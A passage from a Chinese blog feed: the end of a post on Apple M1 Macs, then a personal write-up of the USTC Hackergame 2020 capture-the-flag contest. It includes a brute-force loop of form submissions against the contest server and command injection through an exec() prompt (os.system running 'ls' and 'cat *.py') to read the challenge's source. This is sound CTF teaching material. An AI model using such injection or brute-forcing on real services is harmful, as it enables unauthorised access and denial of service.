href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 